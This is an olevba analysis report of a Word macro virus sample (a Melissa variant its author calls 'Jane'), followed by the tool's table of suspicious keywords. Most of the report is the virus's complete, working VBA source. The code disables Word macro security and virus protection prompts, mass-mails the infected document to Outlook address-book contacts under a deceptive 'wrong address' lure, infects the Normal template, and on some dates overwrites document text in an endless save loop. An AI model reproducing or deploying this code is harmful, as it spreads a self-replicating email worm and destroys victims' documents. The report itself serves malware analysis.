olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Melissa.z-aa444b3445c65c2e745828b7eb6a2e77a62d630f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Jane.cls 
in file: Virus.MSWord.Melissa.z-aa444b3445c65c2e745828b7eb6a2e77a62d630f - OLE stream: 'Macros/VBA/Jane'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
Private Sub Document_Close()
On Error Resume Next
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'JANE! by The Marlboro KID (Killer In Descise)
'It's Inpired clearly by Melissa but the Infection bit is all mine
'Payload part is also by me...of course
'Use it, Loose it, Enjoy ha ha ha.....
'Not ment to make any greater harm....just for the hell of it..
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
regcheck = "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
If System.PrivateProfileString("", regcheck + "9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", regcheck + "9.0\Word\Security", "Level") = 1&
Else
CommandBars("Tools").Controls("Macro").Enabled = False
Options.ConfirmConversions = (1 - 1)
Options.VirusProtection = (1 - 1)
Options.SaveNormalPrompt = (1 - 1)
End If
Dim v1, v2, v3
Set v1 = CreateObject("Outlook.Application")
Set v2 = v1.GetNameSpace("MAPI")
RegAdd = "...made by 'The Marlboro KID'..."
If System.PrivateProfileString("", regcheck, "Jane!") <> RegAdd Then
If v1 = "Outlook" Then
v2.Logon "profile", "password"
    For y = 1 To v2.AddressLists.Count
        Set AddyBook = v2.AddressLists(y)
        x = 1
        Set v3 = v1.CreateItem(0)
        For CountIt = 1 To AddyBook.AddressEntries.Count
            Peep = AddyBook.AddressEntries(x)
            v3.Recipients.Add Peep
            x = x + 1
            If x > 78 Then CountIt = AddyBook.AddressEntries.Count
         Next CountIt
         subj = "Is this the right E-mail address..?"
         v3.Subject = subj & Application.UserName
         Mezz = "Dont know if i sent this to the right E-mail,"
         Mezz = Mezz + "if this isn't ment for you please dont look"
         Mezz = Mezz + "at the attachments, its a private file.."
         Mezz = Mezz + "ThanX ... //"
         v3.Body = Mezz & Application.UserName
         v3.Attachments.Add ActiveDocument.FullName
         v3.Send
         Peep = ""
    Next y
v2.Logoff
End If
System.PrivateProfileString("", regcheck, "Jane!") = RegAdd
End If
Set ActivDoc = ActiveDocument.VBProject.VBComponents.Item(1)
Set NrmTmpl = NormalTemplate.VBProject.VBComponents.Item(1)
ADCountLn = ActivDoc.CodeModule.CountOfLines
NTCountLn = NrmTmpl.CodeModule.CountOfLines
If ActivDoc.Name = "Jane" And NrmTmpl.Name = "Jane" Then GoTo THISISTHEENDMYFRIEND
If ActiveDoc.Name <> "Jane" Then
ActivDoc.Name = "Jane"
Set Dest = ActivDoc
Set Source = NrmTmpl
End If
Dim Replace
If NrmTmpl.Name <> "Jane" Then
NrmTmpl.Name = "Jane"
Replace = True
Set Dest = NrmTmpl
Set Source = ActivDoc
End If
Dim FirstName, LastName, TotalName As String
Randomize
C1 = Int((9999 - 1 + 1) * Rnd + 1)
C2 = Int((999 - 1 + 1) * Rnd + 1)
C3 = C1 * C2
If C3 < 99000000 Then
C3 = C3 + 18900000
End If
FirstName = CStr(C3)
C1 = Int((9 - 1 + 1) * Rnd + 1)
C2 = Int((99 - 1 + 1) * Rnd + 1)
C3 = C1 * C2
If C3 < 900 Then
C3 = C3 + 101
End If
LastName = CStr(C3)
TotalName = "c:\" + FirstName + "." + LastName
If Dir(TotalName) = TotalName Then
Kill (TotalName)
End If
Open TotalName For Output As #1
If Replace = True Then
Print #1, "Private Sub Document_Close()"
Else
Print #1, "Private Sub Document_Open()"
End If
For CountIt = 1 To Source.CodeModule.CountOfLines - 1
Print #1, Source.CodeModule.Lines(CountIt + 1, 1)
Next
Close #1
Dest.CodeModule.AddFromFile TotalName
Kill (TotalName)
THISISTHEENDMYFRIEND:
doc = "Document"
If NTCountLn <> 0 And ADCountLn = 0 And (InStr(1, ActiveDocument.Name, doc) = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True
End If
If Day(Now) = 13 And WeekDay(Now) = 6 Then
MsgBox ("Jason Lives!!!!")
End If
If (Day(Now) Mod 2) <> 0 And (Hour(Now) Mod 2) <> 0 Then
If WeekDay(Now) = 2 Then
Dumb = ActiveDocument.Name
ToNice = "C:\windows\ImSoNice.Huh"
BadTime = "Jane! Jane! Jane! I need a beer! Jane! Jane! Jane!"
If Dir(ToNice) = ToNice Then
Kill (ToNice)
End If
ActiveDocument.SaveAs ToNice
ActiveDocument.SaveAs Dumb
ActiveDocument.StoryRanges(wdMainTextStory).Text = BadTime
ForeverYoung = False
While ForeverYoung = False
ActiveDocument.StoryRanges(wdMainTextStory).Copy
For m = 1 To 66
ActiveDocument.Words.Last.Paste
Next
ActiveDocument.Save
Wend
End If
End If
End Sub
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'I know i could have made this code smaller and simpler but who the f*ck cares
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
